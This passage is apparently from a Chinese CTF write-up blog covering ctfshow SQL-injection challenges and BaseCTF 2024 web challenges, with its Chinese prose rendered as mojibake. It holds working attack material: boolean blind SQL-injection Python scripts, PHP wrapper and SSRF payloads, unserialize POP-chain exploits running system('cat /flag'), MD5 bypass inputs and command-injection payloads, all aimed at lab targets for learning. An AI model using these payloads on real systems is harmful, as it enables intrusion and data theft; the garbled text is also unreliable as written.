class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$username = $_POST[&#x27;username&#x27;];</span><br><span class="line">$password = md5($_POST[&#x27;password&#x27;],true);</span><br><span class="line"></span><br><span class="line">//åªæœ‰adminå¯ä»¥è·å¾—flag</span><br><span class="line">if($username!=&#x27;admin&#x27;)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;ç”¨æˆ·åä¸å­˜åœ¨&#x27;;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯ç™»å½•é¡µé¢ï¼Œ</p><p>string md5( string $str[, bool $raw_output &#x3D; false] )</p><ul><li>raw_outputï¼šå¦‚æœå¯é€‰çš„ raw_output è¢«è®¾ç½®ä¸º TRUEï¼Œé‚£ä¹ˆ MD5 æŠ¥æ–‡æ‘˜è¦å°†ä»¥16å­—èŠ‚é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›ã€‚</li></ul><p><code>ffifdyop</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œç±»ä¼¼ä¸‡èƒ½å¯†ç ã€‚è¿˜æœ‰129581926211651571912466741651878684928ä¹Ÿå¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚</p><p>ç„¶åadmin ffifdyop å°±ç™»å½•è¿›å»äº†ï¼Œè®°å¾—bpæŠ“åŒ…</p><h4 id="188ï¼š"><a href="#188ï¼š" class="headerlink" title="188ï¼š"></a>188ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ç”¨æˆ·åæ£€æµ‹</span><br><span class="line"> if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;ç”¨æˆ·åéæ³•&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //å¯†ç æ£€æµ‹</span><br><span class="line"> if(!is_numeric($password))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //å¯†ç åˆ¤æ–­</span><br><span class="line"> if($row[&#x27;pass&#x27;]==intval($password))&#123;</span><br><span class="line">     $ret[&#x27;msg&#x27;]=&#x27;ç™»é™†æˆåŠŸ&#x27;;</span><br><span class="line">     array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å¤šäº†æ£€æµ‹;</p><p>sqlé‡Œï¼Œæ•°å­—å’Œå­—ç¬¦ä¸²çš„åŒ¹é…æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²ä¼šè½¬æ¢ä¸ºæ•°å­—ï¼Œå¦‚0&#x3D;&#x3D;adminï¼Œé‚£ä¹ˆå¦‚æœè¾“å…¥çš„usernameæ˜¯0ï¼Œåˆ™ä¼šåŒ¹é…æ‰€æœ‰å¼€å¤´ä¸æ˜¯æ•°å­—æˆ–è€…ä¸º0çš„å­—ç¬¦ä¸²å’Œæ•°å­—0ã€‚</p><p>ç„¶åå†æ¥çœ‹passwordçš„åˆ¤æ–­ï¼Œä¹Ÿæ˜¯å¼±ç±»å‹çš„æ¯”è¾ƒï¼Œé‚£ä¹ˆä¹Ÿç›´æ¥è¾“å…¥0ï¼Œå°è¯•ç™»å½•ä¸€ä¸ªç”¨æˆ·åå’Œpassçš„å¼€å¤´æ˜¯å­—æ¯æˆ–æ˜¯0çš„ç”¨æˆ·ã€‚</p><h4 id="189"><a href="#189" class="headerlink" title="189:"></a>189:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ç”¨æˆ·åæ£€æµ‹</span><br><span class="line"> if(preg_match(&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;, $username))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;ç”¨æˆ·åéæ³•&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //å¯†ç æ£€æµ‹</span><br><span class="line"> if(!is_numeric($password))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //å¯†ç åˆ¤æ–­</span><br><span class="line"> if($row[&#x27;pass&#x27;]==$password)&#123;</span><br><span class="line">     $ret[&#x27;msg&#x27;]=&#x27;ç™»é™†æˆåŠŸ&#x27;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæç¤ºflagåœ¨api&#x2F;index.phpæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ˜¯è¦æ˜¯æœ‰load_fileçš„å‡½æ•°</p><p>ç„¶åæµ‹è¯•ï¼šu&#x3D;0&amp;p&#x3D;0æ—¶æ˜¯å¯†ç é”™è¯¯è¯´æ˜å­˜åœ¨u&#x3D;1è¿™ä¸ªè´¦å·ï¼Œè€Œu&#x3D;1&amp;p&#x3D;0æ—¶ï¼ŒæŸ¥è¯¢å¤±è´¥è¯´æ˜æ²¡æœ‰è¿™ä¸ªè´¦å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># @Author:Kradress</span><br><span class="line">from operator import concat</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &#x27;http://45b25a84-ef41-400e-ad2f-ae90d1670eaa.challenge.ctf.show/api/index.php&#x27;</span><br><span class="line">uuid = string.digits+string.ascii_lowercase+&quot;-&#125;&quot;</span><br><span class="line">passwd = &quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;ctfshow&#123;&quot; #ctfshow&#123;</span><br><span class="line">flag = &#x27;ctfshow&#123;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(40):</span><br><span class="line">    for char in uuid:</span><br><span class="line">        print(char)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27; : passwd + f&quot;&#123;char&#125;&#x27;),0,1)&quot;,</span><br><span class="line">            &#x27;password&#x27; : 0</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in res.text:</span><br><span class="line">            passwd += char</span><br><span class="line">            print(passwd)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™ä¸ªå’Œ183é‚£ä¸ªå·®ä¸å¤šï¼Œå°±æ˜¯æ¡ä»¶å°±æ˜¯åœ¨è·¯å¾„é‡Œé¢æŸ¥è¯¢</p><h4 id="190ï¼š"><a href="#190ï¼š" class="headerlink" title="190ï¼š"></a>190ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¯†ç æ£€æµ‹</span><br><span class="line">if(!is_numeric($password))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//å¯†ç åˆ¤æ–­</span><br><span class="line">if($row[&#x27;pass&#x27;]==$password)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;ç™»é™†æˆåŠŸ&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¯•äº†è¯•ï¼Œå‘ç°ä½¿ç”¨u&#x3D;adminå’Œp&#x3D;0æ—¶æ˜¯å¯†ç é”™è¯¯ ç„¶åè¾“å…¥å…¶ä»–çš„è¿˜æ˜¯æœ‰ç”¨æˆ·ä¸å­˜åœ¨çš„å›æ˜¾ï¼Œåº”è¯¥æ˜¯å¸ƒå°”ç›²æ³¨</p><p>ç„¶åå°±æ˜¯ç”¨è„šæœ¬è·‘åº“åï¼Œè·‘è¡¨åï¼Œè·‘åˆ—åï¼Œæ‰¾åˆ°f1agï¼Œç„¶åçŒœflag</p><p>è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://742f0ab8-2de1-4a7e-b0ff-0b33d00fd19f.challenge.ctf.show/api/index.php&quot;</span><br><span class="line">out = &#x27;&#x27;</span><br><span class="line">for j in range(1, 50):</span><br><span class="line">    print(j)</span><br><span class="line">    for k in range(32, 128):</span><br><span class="line">        # çŒœè§£æ•°æ®åº“å</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr(database(),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # çŒœè§£è¡¨å</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # çŒœè§£åˆ—å</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # çŒœè§£ flag</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        re = requests.post(url, data=data)</span><br><span class="line">        if (&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in re.text):</span><br><span class="line">            out += chr(k)</span><br><span class="line">            print(out)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>basectf2024webéƒ¨åˆ†wp</title>
      <link href="/2025/03/18/basectf2024web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/03/18/basectf2024web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="A-Dark-Roomï¼š"><a href="#A-Dark-Roomï¼š" class="headerlink" title="A Dark Roomï¼š"></a>A Dark Roomï¼š</h4><p>æºç ï¼›</p><h4 id="Aura-é…±çš„ç¤¼ç‰©ï¼š"><a href="#Aura-é…±çš„ç¤¼ç‰©ï¼š" class="headerlink" title="Aura é…±çš„ç¤¼ç‰©ï¼š"></a>Aura é…±çš„ç¤¼ç‰©ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); // Aura é…±ï¼Œæ¬¢è¿å›å®¶~ // è¿™é‡Œæœ‰ä¸€ä»½ç¤¼ç‰©ï¼Œè¯·ä½ ç­¾æ”¶ä¸€ä¸‹å“Ÿ~ $pen = $_POST[&#x27;pen&#x27;]; if (file_get_contents($pen) !== &#x27;Aura&#x27;) &#123;   die(&#x27;è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼&#x27;); &#125; // ç¤¼ç‰©æ”¶åˆ°å•¦ï¼Œæ¥ä¸‹æ¥è¦å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~ $challenge = $_POST[&#x27;challenge&#x27;]; if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0) &#123;   die(&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;); &#125; $blog_content = file_get_contents($challenge); if (strpos($blog_content, &#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;) === false) &#123;   die(&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;); &#125; // å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~ $gift = $_POST[&#x27;gift&#x27;]; include($gift); </span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥ï¼šif (file_get_contents($pen) !&#x3D;&#x3D; â€˜Auraâ€™) {   die(â€˜è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼â€™); }  ä½¿ç”¨dataä¼ªåè®®</p><p>pen&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QXVyYQ&#x3D;&#x3D;</p><p>ç¬¬äºŒæ­¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$challenge = $_POST[&#x27;challenge&#x27;]; if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0) &#123;   die(&#x27;è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼&#x27;); &#125; </span><br></pre></td></tr></table></figure><p>ssrfçš„é¢˜ï¼Œè¿›è¡Œ@æˆªæ–­</p><p>ç¬¬ä¸‰æ­¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (strpos($blog_content, &#x27;å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦&#x27;) === false) &#123;   die(&#x27;è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~&#x27;); &#125; // å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~ $gift = $_POST[&#x27;gift&#x27;]; include($gift); </span><br></pre></td></tr></table></figure><p>ä½¿ç”¨filteråè®®è¯»å–æºä»£ç </p><p>gift&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>ç„¶åbase64è§£å¯†å°±è¡Œäº†</p><h4 id="ez-serï¼š"><a href="#ez-serï¼š" class="headerlink" title="ez_serï¼š"></a>ez_serï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); class re&#123;   public $chu0;   public function __toString()&#123;     if(!isset($this-&gt;chu0))&#123;       return &quot;I can not believes!&quot;;     &#125;     $this-&gt;chu0-&gt;$nononono;   &#125; &#125; class web &#123;   public $kw;   public $dt;   public function __wakeup() &#123;     echo &quot;lalalla&quot;.$this-&gt;kw;   &#125;   public function __destruct() &#123;     echo &quot;ALL Done!&quot;;   &#125; &#125; class pwn &#123;   public $dusk;   public $over;   public function __get($name) &#123;     if($this-&gt;dusk != &quot;gods&quot;)&#123;       echo &quot;ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?&quot;;     &#125;     $this-&gt;over-&gt;getflag();   &#125; &#125; class Misc &#123;   public $nothing;   public $flag;   public function getflag() &#123;     eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);   &#125; &#125; class Crypto &#123;   public function __wakeup() &#123;     echo &quot;happy happy happy!&quot;;   &#125;   public function getflag() &#123;     echo &quot;you are over!&quot;;   &#125; &#125; $ser = $_GET[&#x27;ser&#x27;]; unserialize($ser); ?&gt; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class re&#123;</span><br><span class="line">    public $chu0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public $kw;</span><br><span class="line">    public $dt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public $dusk;</span><br><span class="line">    public $over;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public $nothing;</span><br><span class="line">    public $flag;</span><br><span class="line">&#125;</span><br><span class="line">$a = new web();</span><br><span class="line">$b = new re();</span><br><span class="line">$c = new pwn();</span><br><span class="line">$d = new Misc();</span><br><span class="line">$a -&gt; kw = $b;</span><br><span class="line">$b -&gt; chu0 = $c;</span><br><span class="line">$c -&gt; dusk = &#x27;gods&#x27;;</span><br><span class="line">$c -&gt; over = $d;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>ç›´æ¥å‡ºæ¥äº†ï¼›</p><h4 id="md5ç»•è¿‡æ¬¸ï¼š"><a href="#md5ç»•è¿‡æ¬¸ï¼š" class="headerlink" title="md5ç»•è¿‡æ¬¸ï¼š"></a>md5ç»•è¿‡æ¬¸ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);require &#x27;flag.php&#x27;;if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;name2&#x27;]) &amp;&amp; isset($_POST[&#x27;password2&#x27;]) )&#123;  $name = $_GET[&#x27;name&#x27;];  $name2 = $_GET[&#x27;name2&#x27;];  $password = $_POST[&#x27;password&#x27;];  $password2 = $_POST[&#x27;password2&#x27;];  if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;    if ($name2 !== $password2 &amp;&amp; md5($name2) === md5($password2))&#123;      echo $flag;    &#125;    else&#123;      echo &quot;å†çœ‹çœ‹å•Šï¼Œé©¬ä¸Šç»•è¿‡å˜ï¼&quot;;    &#125;  &#125;  else &#123;    echo &quot;é”™å•¦é”™å•¦&quot;;  &#125;&#125;else &#123;  echo &#x27;æ²¡çœ‹åˆ°å‚æ•°å‘&#x27;;&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå¼±æ¯”è¾ƒä¸€ä¸ªå¼ºæ¯”è¾ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=QNKCDZO&amp;name2[]=1</span><br><span class="line">password=240610708&amp;password2[]=2</span><br></pre></td></tr></table></figure><h4 id="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿï¼š"><a href="#flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿï¼š" class="headerlink" title="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿï¼š"></a>flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿï¼š</h4><p>å­¦ä¼šäº†æ–°ä¸œè¥¿ï¼š</p><p>K&#x3D;DirectoryIterator&amp;W&#x3D;&#x2F;secret&#x2F;</p><p>è¿™ä¸ªæ„æ€æ˜¯è°ƒç”¨DirectoryIteratorè¿™ä¸ªå‡½æ•°è¿›è¡Œéå†secretè¿™ä¸ªæ–‡ä»¶å¤¹</p><p>SplFileObjectï¼š<code>SplFileObject</code> æä¾›äº†é¢å‘å¯¹è±¡çš„æ–¹å¼æ¥è¯»å–ã€å†™å…¥å’Œæ“ä½œæ–‡ä»¶</p><p>ç„¶åä¼ªåè®®è¯»å–å°±è¡Œäº†ï¼šJ&#x3D;SplFileObject&amp;H&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;secret&#x2F;f11444g.php</p><h4 id="ä¸€èµ·åƒè±†è±†ï¼š"><a href="#ä¸€èµ·åƒè±†è±†ï¼š" class="headerlink" title="ä¸€èµ·åƒè±†è±†ï¼š"></a>ä¸€èµ·åƒè±†è±†ï¼š</h4><p>æ ¹æ®æç¤ºæŸ¥çœ‹å‰ç«¯jsï¼Œå‘ç°æœ‰base64å¯†ç ï¼Œç›´æ¥è§£å¯†å‡ºæ¥</p><h4 id="å–µå–µå–µÂ´â€¢ï»Œâ€¢"><a href="#å–µå–µå–µÂ´â€¢ï»Œâ€¢" class="headerlink" title="å–µå–µå–µÂ´â€¢ï»Œâ€¢&#96;:"></a>å–µå–µå–µÂ´â€¢ï»Œâ€¢&#96;:</h4><p>å°å°RCE ç›´æ¥system(cat &#x2F;flag);</p><h4 id="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"><a href="#ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³" class="headerlink" title="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³:"></a>ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯ä¸ä¼šå›æ˜¾çš„ï¼Œç„¶åéœ€è¦ç”¨å…¶ä»–æ–¹å¼è¿›è¡Œå¤–å¸¦æ¯”å¦‚é‡å®šå‘</p><p>cmd&#x3D;cat &#x2F;flag&gt;1.txt</p><h4 id="uploadï¼š"><a href="#uploadï¼š" class="headerlink" title="uploadï¼š"></a>uploadï¼š</h4><p>ç›´æ¥ä¼ å°ğŸå°±è¡Œäº†ï¼Œç„¶åèšå‰‘è¿æ¥å°±è¡Œäº† Ez</p><h4 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace:"></a>RCEisamazingwithspace:</h4><p>ç©ºæ ¼ç»•è¿‡ã€‚ç®€å•ï¼šcmd&#x3D;tac${IFS}&#x2F;flag</p><h4 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP :"></a>Really EZ POP :</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); class Sink &#123;   private $cmd = &#x27;echo 123;&#x27;;   public function __toString()   &#123;     eval($this-&gt;cmd);   &#125; &#125; class Shark &#123;   private $word = &#x27;Hello, World!&#x27;;   public function __invoke()   &#123;     echo &#x27;Shark says:&#x27; . $this-&gt;word;   &#125; &#125; class Sea &#123;   public $animal;   public function __get($name)   &#123;     $sea_ani = $this-&gt;animal;     echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();   &#125; &#125; class Nature &#123;   public $sea;   public function __destruct()   &#123;     echo $this-&gt;sea-&gt;see;   &#125; &#125; if ($_POST[&#x27;nature&#x27;]) &#123;   $nature = unserialize($_POST[&#x27;nature&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçŸ¥é“æ€ä¹ˆæ¥çš„ã€‚åˆå­¦äº†ä¸€æ‹›ï¼š<code>Setword</code> æ–¹æ³•ç”¨äºè®¾å®š <code>$word</code> å±æ€§çš„å€¼</p><p>æ³•1ï¼š</p><?phpclass Sink{    private $cmd = 'system("ls");';    public function __toString()    {        eval($this->cmd);    }}class Shark{    private $word = 'Hello, World!';    public function Setword($setword){        $this->word =$setword;    }    public function __invoke()    {        echo 'Shark says:' . $this->word;    }}class Sea{    public $animal;    public function __get($name)    {        $sea_ani = $this->animal;        echo 'In a deep deep sea, there is a ' . $sea_ani();    }}class Nature{    public $sea;    public function __destruct()    {        echo $this->sea->see;    }}$a=new Nature();$a->sea=new Sea();$a->sea->animal=new Shark();$a->sea->animal->Setword(new Sink());echo urlencode(serialize($a));æ³•2ï¼šé€šè¿‡ä½¿ç”¨ PHP çš„åå°„æœºåˆ¶è®¿é—®å’Œä¿®æ”¹ç±»çš„ç§æœ‰å±æ€§ï¼š<?phpclass Sink{    private $cmd = 'system("tac /flag");';    public function __toString() // å½“å¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨ï¼ˆæ‰¾echo $this->aè¿™ç§ã€strtolower()ç­‰ï¼‰    {        eval($this->cmd);  // 1 system("ls");    }}class Shark{    private $word;    public function __invoke()  // å¯¹è±¡è¢«å½“åšå‡½æ•°è¿›è¡Œè°ƒç”¨æ—¶è§¦å‘ï¼ˆæ‰¾æœ‰æ‹¬å·çš„ç±»ä¼¼$a()è¿™ç§ï¼‰    {        echo 'Shark says: ' . $this->word;  // 2 Sink    }}class Sea{    public $animal;    public function __get($name)  // è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨å˜é‡æ—¶è§¦å‘ï¼ˆæ‰¾æœ‰è¿ç»­ç®­å¤´çš„ this->a->bï¼‰    {        $sea_ani = $this->animal;        echo 'In a deep deep sea, there is a ' . $sea_ani();  // 3 Shark    }}class Nature{    public $sea;    public function __destruct()  // å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è§¦å‘ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„é“¾å¤´äº†    {        echo $this->sea->see;  // 4 Sea    }}// æŒ‰ç…§ 1 2 3 4 çš„é¡ºåºç¼–å†™ exp$s1 = new Sink();$s2 = new Shark();$reflection = new ReflectionClass($s2);$property = $reflection->getProperty('word');$property->setAccessible(true);$property->setValue($s2, $s1);$s3 = new Sea();$s3->animal = $s2;$n = new Nature();$n->sea = $s3;echo urlencode(serialize($n));?><p>æ³•3ï¼šé€šè¿‡æ„é€ __construct()é­”æœ¯æ–¹æ³•è®¿é—® ç±»CLASS</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;system(&quot;cat /flag&quot;);&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;word = new Sink();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new Nature();</span><br><span class="line">$b = new Sea();</span><br><span class="line">$c = new Shark();</span><br><span class="line">$a -&gt; sea =$b;</span><br><span class="line">$b -&gt; animal = $c;</span><br><span class="line">$str = serialize($a);</span><br><span class="line">echo $str;?&gt;</span><br></pre></td></tr></table></figure><h4 id="æ»¤ä¸ªä¸åœ"><a href="#æ»¤ä¸ªä¸åœ" class="headerlink" title="æ»¤ä¸ªä¸åœ:"></a>æ»¤ä¸ªä¸åœ:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent = $_POST[&#x27;incompetent&#x27;]; $Datch = $_POST[&#x27;Datch&#x27;]; if ($incompetent !== &#x27;HelloWorld&#x27;) &#123;   die(&#x27;å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼&#x27;); &#125; //è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ $required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;]; $is_valid = true; foreach ($required_chars as $char) &#123;   if (strpos($Datch, $char) === false) &#123;     $is_valid = false;     break;   &#125; &#125; if ($is_valid) &#123;   $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];   foreach ($invalid_patterns as $pattern) &#123;     if (stripos($Datch, $pattern) !== false) &#123;       die(&#x27;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?&#x27;);     &#125;   &#125;    include($Datch); &#125; else &#123;   die(&#x27;æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•&#x27;); &#125; ?&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå…ˆçœ‹çœ‹incompetent&#x3D;HelloWorldè¿™ä¸ªã€‚ç„¶åå†åˆ†æä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;]; $is_valid = true; foreach ($required_chars as $char) &#123;   if (strpos($Datch, $char) === false) &#123;     $is_valid = false;     break;   &#125; 